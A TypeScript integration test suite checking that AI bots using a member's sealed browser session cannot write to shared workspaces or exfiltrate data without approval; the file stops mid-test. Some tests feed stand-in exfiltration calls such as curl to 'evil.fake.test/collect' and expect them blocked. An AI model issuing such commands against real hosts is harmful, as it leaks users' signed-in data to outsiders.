import { randomUUID } from "node:crypto";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { type TestClient, WEB_ORIGIN } from "../../testing";
import { codeOf, type Json, ok, type Res, type SandboxStack, startSandboxStack } from "../../testing-sandbox";
import { startTestStorage, type TestStorage } from "../../testing-storage";
import { recordMemberData, stickyMemberData } from "../bot-capabilities";
import { keepForSite, sealSession } from "../browser/sessions";
import { createConversationAccess } from "../chat";
import { audienceCoverFacts, audienceCovers, createPermissionService } from "../organization";

/**
 * 07.8-25 (BRW-04, SBX-02; D-11 F-8, D-13; P-11, P-18; Pitfall 13): what a bot saw with a member's sign-in stays with
 * the people who could already see it. A team bot that loaded Sam's sealed session cannot write, delete, run or import
 * into the workspace other people's turns read for the rest of that turn; a personal bot can (its workspace is Sam's
 * alone). Real PostgreSQL + Redis + Garage; the in-memory sandboxd and its fake site (P-13). Sessions are sealed and
 * loaded through 07.8-21's own path (`sealSession` → the open loads it, site-locks the page and sets `member_data`).
 */

const HOST = "panel.fake.test";
let storage: TestStorage;
let s: SandboxStack;
/** Sam's personal bot (its workspace audience is Sam alone). */
let scout: { id: string; dm: string };
/** A team bot of the Sales unit (Sam and Alex are members); Sam's DM with it. */
let ops: { id: string; dm: string };
let salesId: string;

const cell = (path: string, ev: Json, agentId: string, body: Json = {}) =>
  s.cell(path, { eventId: ev.eventId, agentId, ...body });
const sandbox = (name: string, ev: Json, agentId: string, body: Json = {}) =>
  cell(`/sandbox/${name}`, ev, agentId, body);
const browser = (name: string, ev: Json, agentId: string, body: Json = {}) =>
  cell(`/browser/${name}`, ev, agentId, body);

const turnRow = async (eventId: string) =>
  (
    await s.su.query("select tainted, sandbox_calls, member_data from app.agent_turns where event_id = $1", [
      eventId,
    ])
  ).rows[0] as Json;

const auditOf = async (action: string, eventId: string) =>
  (
    await s.su.query(
      `select agent_id, user_id, result, metadata from app.audit_events
        where action = $1 and metadata->>'eventId' = $2 order by occurred_at, id`,
      [action, eventId],
    )
  ).rows as Json[];

const callsOf = async (eventId: string) =>
  (
    await s.su.query(
      "select tool, decision, reason, status from app.agent_tool_calls where event_id = $1 order by created_at",
      [eventId],
    )
  ).rows as Json[];

const stepsOf = async (eventId: string) =>
  ((await s.su.query("select steps from app.bot_turn_activity where event_id = $1", [eventId])).rows[0]
    ?.steps ?? []) as Json[];

const fakeContext = (contextId: string) =>
  s.sandboxd.stats().browser.contexts.find((c) => c.contextId === contextId) as Json | undefined;

const fakeCalls = (op: string) => s.sandboxd.stats().calls[op] ?? 0;

/** Writes straight into the fake sandboxd (setup only; the bot's own calls go through the API). */
async function seedFile(agentId: string, path: string, content: string): Promise<void> {
  const res = await fetch(`${s.sandboxd.url}/v1/files/write`, {
    method: "POST",
    headers: { authorization: `Bearer ${s.sandboxd.token}`, "content-type": "application/json" },
    body: JSON.stringify({
      target: { orgId: s.orgA, agentId },
      path,
      content,
      encoding: "utf8",
      mode: "overwrite",
    }),
  });
  expect(res.status).toBe(200);
}

/** Sam's sealed session with `agentId` for the fake site, through 07.8-21's seal (as Sam). */
async function sealFor(userId: string, agentId: string): Promise<string> {
  const kept = keepForSite(
    JSON.stringify({
      cookies: [
        { name: "fake_session", value: `v-${randomUUID()}`, domain: HOST, path: "/", expires: 2_000_000_000 },
      ],
      origins: [],
    }),
    HOST,
  );
  if (!kept) throw new Error("no state kept");
  const core = s.stack.built.core;
  const r = await core.db.withTenant({ organizationId: s.orgA, userId }, (tx) =>
    sealSession(tx, core, { userId, agentId, siteKey: HOST, kept, contextId: null }),
  );
  return r.sessionId;
}

const setCaps = (agentId: string) =>
  s.su.query(
    `update app.agents set capabilities = capabilities || '{"sandbox": true, "browser": true}'::jsonb where id = $1`,
    [agentId],
  );

/** A turn of `who` with `agentId` in its DM, with Sam's session loaded through the real open (member data). */
async function signedInTurn(bot: { id: string; dm: string }): Promise<{ ev: Json; contextId: string }> {
  const ev = await s.turnOf(s.sam, bot.dm, bot.id);
  const opened = await ok(browser("open", ev, bot.id, { url: `https://${HOST}/reports` }));
  expect(opened).toMatchObject({ host: HOST, signedIn: true });
  return { ev, contextId: opened.contextId as string };
}

beforeAll(async () => {
  storage = await startTestStorage();
  try {
    s = await startSandboxStack({ env: { ...storage.env } });
  } catch (err) {
    await storage.stop();
    throw err;
  }
  await s.setPolicy({ enabled: true });
  await s.su.query(
    "update app.sandbox_policies set max_browsers = 50, max_sandboxes = 50 where organization_id = $1",
    [s.orgA],
  );

  const personal = await ok(
    s.sam.request("POST", "/api/v1/agents/personal", {
      name: "Scout",
      instructions: "Answer briefly.",
      modelProvider: "mock",
      modelId: "mock-1",
    }) as Promise<Res>,
  );
  scout = { id: personal.agent.id as string, dm: personal.dmId as string };
  await setCaps(scout.id);

  salesId = (
    await ok(
      s.victor.request("POST", "/api/v1/units", {
        kind: "department",
        name: "Sales",
        parentId: null,
      }) as Promise<Res>,
    )
  ).id as string;
  for (const userId of [s.samId, s.alexId]) {
    await ok(s.victor.request("POST", `/api/v1/units/${salesId}/members`, { userId }) as Promise<Res>);
  }
  const opsId = (
    await ok(
      s.victor.request("POST", "/api/v1/agents", {
        name: "Ops",
        username: "ops",
        instructions: "You are Ops.",
        modelProvider: "mock",
        modelId: "mock-1",
        unitId: salesId,
      }) as Promise<Res>,
    )
  ).id as string;
  await setCaps(opsId);
  const opsDm = (
    await ok(
      s.sam.request("POST", "/api/v1/dms", { participants: [{ kind: "agent", id: opsId }] }) as Promise<Res>,
    )
  ).id as string;
  ops = { id: opsId, dm: opsDm };

  await sealFor(s.samId, scout.id);
  await sealFor(s.samId, ops.id);
}, 240_000);

afterAll(async () => {
  try {
    await s?.stop();
  } finally {
    await storage?.stop();
  }
});

// ---------------------------------------------------------------- Task 1: the tracer (P-11)

describe("a team bot that used Sam's sign-in cannot put what it saw into its shared workspace (F-8, P-11)", () => {
  it("open loads Sam's session (site lock, member_data) → snapshot → write, exec and delete are 403 member_data; read and list still work", async () => {
    await seedFile(ops.id, "notes/old.txt", "kept from before");
    const { ev, contextId } = await signedInTurn(ops);
    expect(fakeContext(contextId)).toMatchObject({ siteLock: HOST, loadedState: true });
    expect((await turnRow(ev.eventId)).member_data).toBe(true);
    await ok(browser("snapshot", ev, ops.id));

    const writesBefore = fakeCalls("filesWrite");
    const execBefore = fakeCalls("exec");
    const w = await sandbox("write", ev, ops.id, {
      path: "notes/seen.txt",
      content: "orders",
      mode: "create",
    });
    expect(w.status).toBe(403);
    expect(codeOf(w)).toBe("member_data");
    const x = await sandbox("exec", ev, ops.id, { argv: ["sh", "-c", "echo orders > notes/x.txt"] });
    expect(x.status).toBe(403);
    expect(codeOf(x)).toBe("member_data");
    const d = await sandbox("delete", ev, ops.id, { path: "notes/old.txt" });
    expect(d.status).toBe(403);
    expect(codeOf(d)).toBe("member_data");
    expect(fakeCalls("filesWrite")).toBe(writesBefore);
    expect(fakeCalls("exec")).toBe(execBefore);

    const read = await ok(sandbox("read", ev, ops.id, { path: "notes/old.txt" }));
    expect(read.content).toBe("kept from before");
    const list = await ok(sandbox("list", ev, ops.id, { path: "notes" }));
    expect((list.entries as Json[]).map((e) => e.name)).toEqual(["old.txt"]);

    // Refusals are decided calls: recorded, audited with ids only, and shown as blocked steps; never counted.
    const refused = (await callsOf(ev.eventId)).filter((c) => c.reason === "member_data");
    expect(refused.map((c) => c.tool)).toEqual([
      "ocw_sandbox_write",
      "ocw_sandbox_exec",
      "ocw_sandbox_delete",
    ]);
    const audits = (await auditOf("bot.tool_call", ev.eventId)).filter(
      (a) => a.metadata.reason === "member_data",
    );
    expect(audits).toHaveLength(3);
    for (const a of audits) {
      expect(a).toMatchObject({ agent_id: ops.id, user_id: s.samId, result: "denied" });
      expect(JSON.stringify(a.metadata)).not.toMatch(/notes|orders|echo/u);
    }
    const blocked = (await stepsOf(ev.eventId)).filter((st) => st.outcome.code === "member_data");
    expect(blocked.map((st) => [st.verb, st.outcome.kind])).toEqual([
      ["blocked", "blocked"],
      ["blocked", "blocked"],
      ["blocked", "blocked"],
    ]);
    expect((await turnRow(ev.eventId)).sandbox_calls).toBe(4);
  });

  it("a later turn of Ops in Sam's DM keeps the member data (sticky per bot and conversation, #292); Ops in Alex's DM writes", async () => {
    // The bot's history in Sam's DM may hold what it read signed in: no write, delete or exec there, ever again.
    const ev = await s.turnOf(s.sam, ops.dm, ops.id);
    expect((await turnRow(ev.eventId)).member_data).toBe(true);
    const writesBefore = fakeCalls("filesWrite");
    const w = await sandbox("write", ev, ops.id, {
      path: "notes/later.txt",
      content: "orders",
      mode: "overwrite",
    });
    expect(w.status).toBe(403);
    expect(codeOf(w)).toBe("member_data");
    const del = await sandbox("delete", ev, ops.id, { path: "notes/old.txt" });
    expect(codeOf(del)).toBe("member_data");
    expect(fakeCalls("filesWrite")).toBe(writesBefore);
    await ok(sandbox("read", ev, ops.id, { path: "notes/old.txt" }));
    const sticky = (
      await s.su.query(
        "select sites, first_event_id from app.agent_member_data where agent_id = $1 and conversation_id = $2",
        [ops.id, ops.dm],
      )
    ).rows;
    expect(sticky).toHaveLength(1);
    expect(sticky[0].sites).toEqual([HOST]);

    // Another conversation of the same bot never loaded a session: its turns are as before.
    const alexDm = (
      await ok(
        s.alex.request("POST", "/api/v1/dms", {
          participants: [{ kind: "agent", id: ops.id }],
        }) as Promise<Res>,
      )
    ).id as string;
    const other = await s.turnOf(s.alex, alexDm, ops.id);
    expect((await turnRow(other.eventId)).member_data).toBe(false);
    const fine = await ok(
      sandbox("write", other, ops.id, { path: "notes/later.txt", content: "fine", mode: "overwrite" }),
    );
    expect(fine).toMatchObject({ path: "notes/later.txt", size: 4 });
  });

  it("Sam's personal bot in the same situation writes, runs and deletes (its workspace is Sam's alone)", async () => {
    await seedFile(scout.id, "notes/old.txt", "mine");
    const { ev, contextId } = await signedInTurn(scout);
    expect(fakeContext(contextId)).toMatchObject({ siteLock: HOST, loadedState: true });
    expect((await turnRow(ev.eventId)).member_data).toBe(true);
    await ok(browser("snapshot", ev, scout.id));
    await ok(
      sandbox("write", ev, scout.id, { path: "notes/seen.txt", content: "orders", mode: "overwrite" }),
    );
    await ok(sandbox("delete", ev, scout.id, { path: "notes/old.txt" }));
    expect((await callsOf(ev.eventId)).filter((c) => c.reason === "member_data")).toEqual([]);
  });
});

// ---------------------------------------------------------------- Task 2: downloads routed by audience, and import

const approvalRow = async (id: string) =>
  (await s.su.query("select * from app.approval_requests where id = $1", [id])).rows[0] as Json;

async function decideApproval(who: TestClient, id: string, outcome: "approved" | "denied") {
  const row = await approvalRow(id);
  return ok(
    who.request("POST", `/api/v1/approvals/${id}/decision`, {
      outcome,
      actionHash: row.action_hash,
    }) as Promise<Res>,
  );
}

/** The one `agent.card_action.v1` of the approval's card (the re-run turn). */
async function rerunOf(approvalId: string): Promise<Json> {
  const row = await approvalRow(approvalId);
  const rows = (
    await s.su.query(
      "select payload from app.stream_events where stream_id = $1 and type = 'agent.card_action.v1' and payload->'cardAction'->>'messageId' = $2 order by seq",
      [`cell:${s.orgA}`, row.card_message_id],
    )
  ).rows;
  expect(rows).toHaveLength(1);
  return rows[0].payload as Json;
}

/** The bot's reply for a turn (links the files the turn stored for the conversation). */
const replyTo = (ev: Json, agentId: string, text = "Here it is.") =>
  ok(
    s.cell("/messages", {
      agentId,
      conversationId: ev.conversation.id,
      threadRootMessageId: null,
      eventId: ev.eventId,
      text,
      idempotencyKey: `reply-${randomUUID()}`,
    }),
  );

const attachmentRow = async (id: string) =>
  (
    await s.su.query(
      "select status, uploader_id, event_id, message_id, conversation_id, size_bytes, filename from app.attachments where id = $1",
      [id],
    )
  ).rows[0] as Json | undefined;

function download(who: TestClient, attachmentId: string): Promise<Response> {
  return fetch(`${s.stack.baseUrl}/api/v1/attachments/${attachmentId}/download`, {
    redirect: "manual",
    headers: { origin: WEB_ORIGIN, cookie: who.cookieHeader },
  });
}

const DOWNLOADED = "id,amount\n1,1250\n";

/** A ready attachment of `conv`, shared by `agentId` from its workspace and linked to its reply. */
async function sharedAttachment(
  who: TestClient,
  conv: string,
  agentId: string,
  content: string,
): Promise<string> {
  const ev = await s.turnOf(who, conv, agentId);
  const name = `in-${randomUUID().slice(0, 6)}.csv`;
  await seedFile(agentId, `out/${name}`, content);
  const shared = await ok(sandbox("share", ev, agentId, { path: `out/${name}` }));
  await replyTo(ev, agentId);
  expect((await attachmentRow(shared.attachmentId as string))?.status).toBe("ready");
  return shared.attachmentId as string;
}

describe("a download lands where its audience allows (F-8, P-11)", () => {
  it("with Sam's session loaded: a pending attachment of the conversation for the reply, never the workspace", async () => {
    const { ev, contextId } = await signedInTurn(scout);
    const importsBefore = fakeCalls("filesImport");
    // A signed-in click waits for Sam first (07.8-14's floor).
    const asked = await browser("act", ev, scout.id, { action: "click", ref: "download-link" });
    expect(codeOf(asked)).toBe("approval_required");
    const id = asked.body?.error.details.approval.id as string;
    await decideApproval(s.sam, id, "approved");
    const rerun = await rerunOf(id);
    const acted = await ok(browser("act", rerun, scout.id, { action: "click", ref: "download-link" }));
    expect(acted.download).toMatchObject({
      stored: "conversation",
      name: "report.csv",
      size: DOWNLOADED.length,
    });
    expect(acted.download.path).toBeUndefined();
    const attachmentId = acted.download.attachmentId as string;
    expect(fakeCalls("filesImport")).toBe(importsBefore);
    expect(await attachmentRow(attachmentId)).toMatchObject({
      status: "pending",
      uploader_id: scout.id,
      event_id: rerun.eventId,
      conversation_id: scout.dm,
      message_id: null,
    });
    expect((await download(s.sam, attachmentId)).status).toBe(404);

    const posted = await replyTo(rerun, scout.id);
    expect(await attachmentRow(attachmentId)).toMatchObject({
      status: "ready",
      message_id: posted.messageId,
    });
    const res = await download(s.sam, attachmentId);
    expect(res.status).toBe(302);
    expect(await (await fetch(res.headers.get("location") as string)).text()).toBe(DOWNLOADED);
    expect((await download(s.alex, attachmentId)).status).toBe(404);

    const stored = await auditOf("browser.download_stored", rerun.eventId);
    expect(stored).toHaveLength(1);
    expect(stored[0]).toMatchObject({ agent_id: scout.id, user_id: s.samId, result: "success" });
    expect(stored[0]?.metadata).toEqual({
      eventId: rerun.eventId,
      contextId,
      host: HOST,
      size: DOWNLOADED.length,
      stored: "conversation",
      attachmentId,
      conversationId: scout.dm,
    });
    const steps = await stepsOf(rerun.eventId);
    expect(steps.map((st) => [st.verb, st.target, st.outcome.kind])).toContainEqual([
      "shared",
      "report.csv",
      "ok",
    ]);
  });

  it("without a session: `downloads/report.csv` in the bot's workspace, then a free name; audited by path hash only", async () => {
    // Sam's DM with Scout loaded his session in the previous test: its turns keep member data from now on (sticky,
    // #292). A bot that never loaded a session in its conversation shows the plain rule.
    const docs = await s.newBot(`Docs ${randomUUID().slice(0, 4)}`);
    await setCaps(docs.id);
    const ev = await s.turnOf(s.sam, docs.dm, docs.id);
    await ok(browser("open", ev, docs.id, { url: "https://docs.fake.test/files" }));
    expect((await turnRow(ev.eventId)).member_data).toBe(false);
    const importsBefore = fakeCalls("filesImport");
    const first = await ok(browser("act", ev, docs.id, { action: "click", ref: "download-link" }));
    expect(first.download).toEqual({
      stored: "workspace",
      name: "report.csv",
      size: DOWNLOADED.length,
      path: "downloads/report.csv",
    });
    expect(fakeCalls("filesImport")).toBe(importsBefore + 1);
    const second = await ok(browser("act", ev, docs.id, { action: "click", ref: "download-link" }));
    expect(second.download.path).toBe("downloads/report-2.csv");
    const read = await ok(sandbox("read", ev, docs.id, { path: "downloads/report.csv" }));
    expect(read.content).toBe(DOWNLOADED);

    const stored = await auditOf("browser.download_stored", ev.eventId);
    expect(stored.map((a) => a.metadata.stored)).toEqual(["workspace", "workspace"]);
    expect(stored[0]?.metadata).toMatchObject({
      host: "docs.fake.test",
      size: DOWNLOADED.length,
      pathLength: 20,
    });
    expect(JSON.stringify(stored)).not.toContain("report");
    const steps = await stepsOf(ev.eventId);
    expect(steps.filter((st) => st.verb === "imported").map((st) => st.target)).toEqual([
      "downloads/report.csv",
      "downloads/report-2.csv",
    ]);
  });

  it("the bot's sandbox off: the download is not kept; the act says so and the activity shows why", async () => {
    const clipper = await s.newBot(`Clipper ${randomUUID().slice(0, 4)}`);
    await s.su.query(
      `update app.agents set capabilities = capabilities || '{"sandbox": false, "browser": true}'::jsonb where id = $1`,
      [clipper.id],
    );
    const ev = await s.turnOf(s.sam, clipper.dm, clipper.id);
    await ok(browser("open", ev, clipper.id, { url: "https://docs.fake.test/files" }));
    const importsBefore = fakeCalls("filesImport");
    const acted = await ok(browser("act", ev, clipper.id, { action: "click", ref: "download-link" }));
    expect(acted.download).toBeNull();
    expect(fakeCalls("filesImport")).toBe(importsBefore);
    const discarded = await auditOf("browser.download_discarded", ev.eventId);
    expect(discarded).toHaveLength(1);
    expect(discarded[0]?.metadata).toMatchObject({ reason: "sandbox_off", host: "docs.fake.test" });
    const steps = await stepsOf(ev.eventId);
    expect(steps.at(-1)).toMatchObject({
      verb: "blocked",
      target: "Download not kept: the sandbox is off",
      outcome: { kind: "blocked", code: "sandbox_off" },
    });
  });
});

describe("ocw_sandbox_import: only when the conversation's audience covers the workspace's (F-8, audienceCovers)", () => {
  let salesAll: string;

  beforeAll(async () => {
    salesAll = (
      await ok(
        s.victor.request("POST", "/api/v1/channels", {
          name: `sales-all-${randomUUID().slice(0, 4)}`,
          visibility: "private",
        }) as Promise<Res>,
      )
    ).id as string;
    for (const [kind, id] of [
      ["user", s.samId],
      ["user", s.alexId],
      ["agent", ops.id],
    ] as const) {
      await ok(
        s.victor.request("POST", `/api/v1/channels/${salesAll}/members`, { kind, id }) as Promise<Res>,
      );
    }
  });

  it("is offered with the other sandbox tools", async () => {
    const ev = await s.turnOf(s.sam, scout.dm, scout.id);
    expect(ev.turn.tools).toContain("ocw_sandbox_import");
    expect(ev.turn.toolFlags.ocw_sandbox_import).toEqual({ untrustedOutput: false, sideEffecting: false });
  });

  it("Scout (personal) in Sam's DM copies a DM attachment into its workspace; audited with ids and size only", async () => {
    const attachmentId = await sharedAttachment(s.sam, scout.dm, scout.id, "a,b\n1,2\n");
    const ev = await s.turnOf(s.sam, scout.dm, scout.id);
    const imported = await ok(sandbox("import", ev, scout.id, { attachmentId, path: "inbox/numbers.csv" }));
    expect(imported).toEqual({ path: "inbox/numbers.csv", size: 8 });
    expect((await ok(sandbox("read", ev, scout.id, { path: "inbox/numbers.csv" }))).content).toBe(
      "a,b\n1,2\n",
    );
    const audits = await auditOf("sandbox.file_imported", ev.eventId);
    expect(audits).toHaveLength(1);
    expect(audits[0]).toMatchObject({ agent_id: scout.id, user_id: s.samId, result: "success" });
    expect(audits[0]?.metadata).toMatchObject({
      attachmentId,
      conversationId: scout.dm,
      size: 8,
      pathLength: 17,
    });
    expect(JSON.stringify(audits)).not.toContain("numbers");
    const step = (await stepsOf(ev.eventId)).find((st) => st.tool === "ocw_sandbox_import");
    expect(step).toMatchObject({ verb: "imported", target: "inbox/numbers.csv", outcome: { kind: "ok" } });
    // Without a path it goes to `downloads/<name>`.
    const again = await ok(sandbox("import", ev, scout.id, { attachmentId }));
    expect(again.path).toMatch(/^downloads\/in-[0-9a-f]{6}\.csv$/u);
  });

  it("Ops (team bot of Sales) in Sam's DM → 403 audience_narrower; nothing reaches sandboxd", async () => {
    const attachmentId = await sharedAttachment(s.sam, ops.dm, ops.id, "secret,1\n");
    const ev = await s.turnOf(s.sam, ops.dm, ops.id);
    const before = fakeCalls("filesImport");
    const r = await sandbox("import", ev, ops.id, { attachmentId });
    expect(r.status).toBe(403);
    expect(codeOf(r)).toBe("audience_narrower");
    expect(fakeCalls("filesImport")).toBe(before);
    const refused = (await auditOf("bot.tool_call", ev.eventId)).filter(
      (a) => a.metadata.reason === "audience_narrower",
    );
    expect(refused).toHaveLength(1);
    expect(refused[0]?.metadata).toMatchObject({ tool: "ocw_sandbox_import", attachmentId });
    expect((await turnRow(ev.eventId)).sandbox_calls).toBe(0);
  });

  it("Ops in #sales-all, read by everyone Ops serves, imports; an attachment of another conversation is 404 not_found", async () => {
    const mention = async () => {
      const msg = await ok(
        s.sam.request("POST", `/api/v1/conversations/${salesAll}/messages`, {
          body: `@ops please ${randomUUID().slice(0, 6)}`,
        }) as Promise<Res>,
      );
      const rows = (
        await s.su.query(
          "select payload from app.stream_events where stream_id = $1 and type = 'agent.mention.v1' and payload->'message'->>'id' = $2 and payload->'agent'->>'id' = $3",
          [`cell:${s.orgA}`, msg.id, ops.id],
        )
      ).rows;
      expect(rows).toHaveLength(1);
      return rows[0].payload as Json;
    };
    const share = await mention();
    await seedFile(ops.id, "out/q3.csv", "q,3\n");
    const shared = await ok(sandbox("share", share, ops.id, { path: "out/q3.csv" }));
    await replyTo(share, ops.id);

    const ev = await mention();
    const imported = await ok(
      sandbox("import", ev, ops.id, { attachmentId: shared.attachmentId, path: "q3.csv" }),
    );
    expect(imported).toEqual({ path: "q3.csv", size: 4 });

    const dmAttachment = await sharedAttachment(s.sam, scout.dm, scout.id, "x\n");
    const other = await sandbox("import", ev, ops.id, { attachmentId: dmAttachment });
    expect(other.status).toBe(404);
    expect(codeOf(other)).toBe("not_found");
    const missing = await sandbox("import", ev, ops.id, { attachmentId: randomUUID() });
    expect(codeOf(missing)).toBe("not_found");
  });

  it("the resolver's facts in another organization's tenant know neither bot nor conversation: not covered", async () => {
    const core = s.stack.built.core;
    const perms = createPermissionService(core);
    const access = createConversationAccess(core);
    const facts = await core.db.withTenant({ organizationId: s.orgB, userId: s.eveId }, (tx) =>
      audienceCoverFacts(
        tx,
        { perms, isReadable: (t, u, c) => access.isReadable(t, u, c) },
        { conversationId: scout.dm, agentId: scout.id },
      ),
    );
    expect(facts).toEqual({ workspace: null, readers: null });
    expect(audienceCovers(facts)).toBe(false);
    // The same call in organization A covers Sam's DM with his personal bot.
    const mine = await core.db.withTenant({ organizationId: s.orgA, userId: s.samId }, (tx) =>
      audienceCoverFacts(
        tx,
        { perms, isReadable: (t, u, c) => access.isReadable(t, u, c) },
        { conversationId: scout.dm, agentId: scout.id },
      ),
    );
    expect(audienceCovers(mine)).toBe(true);
  });
});

// ---------------------------------------------------------------- Task 3: D-13 end to end (browser and shell)

const view = async (who: TestClient, id: string) =>
  (await ok(who.request("GET", `/api/v1/approvals/${id}`) as Promise<Res>)) as Json;

const setEgress = (mode: "off" | "allowlist" | "public") =>
  s.su.query("update app.sandbox_policies set sandbox_egress_mode = $2 where organization_id = $1", [
    s.orgA,
    mode,
  ]);

const egressMode = async () =>
  (
    await s.su.query("select sandbox_egress_mode from app.sandbox_policies where organization_id = $1", [
      s.orgA,
    ])
  ).rows[0].sandbox_egress_mode as string;

describe("D-13: after Sam's sign-in was used, nothing leaves for another host without Sam's yes (P-18)", () => {
  it("1. a cross-site open waits for Sam (open of evil.fake.test, session site panel.fake.test); approved, it goes once past the lock", async () => {
    const { ev, contextId } = await signedInTurn(scout);
    const r = await browser("open", ev, scout.id, { url: "https://evil.fake.test/collect?d=x" });
    expect(r.status).toBe(409);
    expect(codeOf(r)).toBe("approval_required");
    // Nothing reached the other host: the page stayed on the session's site.
    expect(fakeContext(contextId)?.host).toBe(HOST);
    const id = r.body?.error.details.approval.id as string;
    const v = await view(s.sam, id);
    expect(v.view.title).toBe("Open evil.fake.test");
    expect(v.view.browser).toMatchObject({ action: "open", host: "evil.fake.test", sessionSite: HOST });
    const row = await approvalRow(id);
    expect(Date.parse(row.expires_at) - Date.parse(row.created_at)).toBeLessThanOrEqual(15 * 60_000 + 1000);
    const requested = (await auditOf("bot.tool_call", ev.eventId)).filter(
      (a) => a.metadata.reason === "approval_required",
    );
    expect(requested.at(-1)?.metadata).toMatchObject({ tool: "ocw_browser_open", target: "browser" });
    expect(JSON.stringify(requested)).not.toContain("collect");

    await decideApproval(s.sam, id, "approved");
    const rerun = await rerunOf(id);
    const navBefore = fakeCalls("contextNavigate");
    const went = await ok(browser("open", rerun, scout.id, { url: "https://evil.fake.test/collect?d=x" }));
    expect(went).toMatchObject({ contextId, host: "evil.fake.test" });
    expect(fakeCalls("contextNavigate")).toBe(navBefore + 1);
    expect((await approvalRow(id)).consumed_at).not.toBeNull();
    await ok(browser("close", rerun, scout.id));
  });

  it("2. an act the site lock stopped (the Export link to evil.fake.test) asks for an `open` of that host; no second navigation before the yes", async () => {
    const { ev, contextId } = await signedInTurn(scout);
    const click = await browser("act", ev, scout.id, { action: "click", ref: "export-link" });
    expect(codeOf(click)).toBe("approval_required");
    const clickId = click.body?.error.details.approval.id as string;
    await decideApproval(s.sam, clickId, "approved");
    const rerun = await rerunOf(clickId);
    const actsBefore = fakeCalls("contextAct");
    const blocked = await browser("act", rerun, scout.id, { action: "click", ref: "export-link" });
    expect(blocked.status).toBe(409);
    expect(codeOf(blocked)).toBe("approval_required");
    expect(fakeCalls("contextAct")).toBe(actsBefore + 1);
    expect(fakeContext(contextId)?.host).toBe(HOST);
    const openId = blocked.body?.error.details.approval.id as string;
    const v = await view(s.sam, openId);
    expect(v.view.title).toBe("Open evil.fake.test");
    expect(v.view.browser).toMatchObject({ action: "open", host: "evil.fake.test", sessionSite: HOST });
    // Asking again before Sam answers does not act again (the signed-in click's own grant was used).
    const again = await browser("act", rerun, scout.id, { action: "click", ref: "export-link" });
    expect(again.status).toBe(409);
    expect(fakeCalls("contextAct")).toBe(actsBefore + 1);
    expect(fakeContext(contextId)?.host).toBe(HOST);
    await ok(browser("close", rerun, scout.id));
  });

  it("3. sandbox egress `allowlist`: exec waits for Sam with the exec view; it expires after 15 minutes and never ran; approved, it runs once", async () => {
    await setEgress("allowlist");
    const { ev } = await signedInTurn(scout);
    const execBefore = fakeCalls("exec");
    const r = await sandbox("exec", ev, scout.id, { argv: ["curl", "https://api.fake.test"] });
    expect(r.status).toBe(409);
    expect(codeOf(r)).toBe("approval_required");
    expect(fakeCalls("exec")).toBe(execBefore);
    const id = r.body?.error.details.approval.id as string;
    const v = await view(s.sam, id);
    expect(v.view.title).toBe("Run a command with internet access after using Sam Lee's sign-in");
    expect(v.view.preview).toEqual([
      { key: "command", label: "Command", value: "curl https://api.fake.test" },
      { key: "internet access", label: "Internet access", value: "Allowed hosts only" },
    ]);
    expect(v.view.approverLabel).toBe("Waiting for Sam Lee to approve");
    const row = await approvalRow(id);
    expect(Date.parse(row.expires_at) - Date.parse(row.created_at)).toBeLessThanOrEqual(15 * 60_000 + 1000);
    expect(Date.parse(row.expires_at) - Date.parse(row.created_at)).toBeGreaterThan(14 * 60_000);
    const requested = (await auditOf("bot.tool_call", ev.eventId)).filter(
      (a) => a.metadata.reason === "approval_required",
    );
    expect(requested).toHaveLength(1);
    expect(requested[0]?.metadata).toMatchObject({
      tool: "ocw_sandbox_exec",
      memberData: "egress_exec",
      egress: "allowlist",
    });
    expect(JSON.stringify(requested)).not.toContain("api.fake.test");

    // 15 minutes later (the clock moved past its expiry): expired, and the command never ran.
    await s.su.query(
      "update app.approval_requests set expires_at = now() - interval '1 second', created_at = now() - interval '15 minutes 1 second' where id = $1",
      [id],
    );
    const late = await s.sam.request("POST", `/api/v1/approvals/${id}/decision`, {
      outcome: "approved",
      actionHash: row.action_hash,
    });
    expect(late.status).toBe(409);
    expect((await view(s.sam, id)).status).toBe("expired");
    expect(fakeCalls("exec")).toBe(execBefore);

    // A new request, approved by Sam: the re-run turn runs the command once.
    const ask = await sandbox("exec", ev, scout.id, { argv: ["curl", "https://api.fake.test"] });
    const fresh = ask.body?.error.details.approval.id as string;
    expect(fresh).not.toBe(id);
    await decideApproval(s.sam, fresh, "approved");
    const rerun = await rerunOf(fresh);
    // The re-run continues a turn that used Sam's sign-in: it has member data from its start (D-13 keeps applying).
    expect((await turnRow(rerun.eventId)).member_data).toBe(true);
    await ok(sandbox("exec", rerun, scout.id, { argv: ["curl", "https://api.fake.test"] }));
    expect(fakeCalls("exec")).toBe(execBefore + 1);
    expect((await approvalRow(fresh)).consumed_at).not.toBeNull();
    const used = await sandbox("exec", rerun, scout.id, { argv: ["curl", "https://api.fake.test"] });
    expect(codeOf(used)).toMatch(/^approval_(required|used)$/u);
    expect(fakeCalls("exec")).toBe(execBefore + 1);
  });

  it("4. sandbox egress `off`: the same exec runs without approval; `public`: approval again (Any public host)", async () => {
    const { ev } = await signedInTurn(scout);
    await setEgress("off");
    try {
      const execBefore = fakeCalls("exec");
      await ok(sandbox("exec", ev, scout.id, { argv: ["curl", "https://api.fake.test"] }));
      expect(fakeCalls("exec")).toBe(execBefore + 1);
      await setEgress("public");
      const r = await sandbox("exec", ev, scout.id, { argv: ["curl", "https://api.fake.test"] });
      expect(codeOf(r)).toBe("approval_required");
      const v = await view(s.sam, r.body?.error.details.approval.id as string);
      expect(v.view.preview.at(-1)).toMatchObject({ label: "Internet access", value: "Any public host" });
      expect(fakeCalls("exec")).toBe(execBefore + 1);
    } finally {
      await setEgress("allowlist");
    }
    expect(await egressMode()).toBe("allowlist");
  });

  it("5. a later turn in Sam's DM with Scout, with no page open, keeps member data (#292): exec under `allowlist` and an open of another host ask Sam; the loaded site opens without asking", async () => {
    const closing = await s.turnOf(s.sam, scout.dm, scout.id);
    await ok(browser("close", closing, scout.id));
    const ev = await s.turnOf(s.sam, scout.dm, scout.id);
    expect((await turnRow(ev.eventId)).member_data).toBe(true);
    const execBefore = fakeCalls("exec");
    const navBefore = fakeCalls("contextNavigate");
    const r = await sandbox("exec", ev, scout.id, {
      argv: ["curl", "https://evil.fake.test/collect?d=later"],
    });
    expect(codeOf(r)).toBe("approval_required");
    const away = await browser("open", ev, scout.id, { url: "https://evil.fake.test/collect?d=later" });
    expect(away.status).toBe(409);
    expect(codeOf(away)).toBe("approval_required");
    const v = await view(s.sam, away.body?.error.details.approval.id as string);
    expect(v.view.title).toBe("Open evil.fake.test");
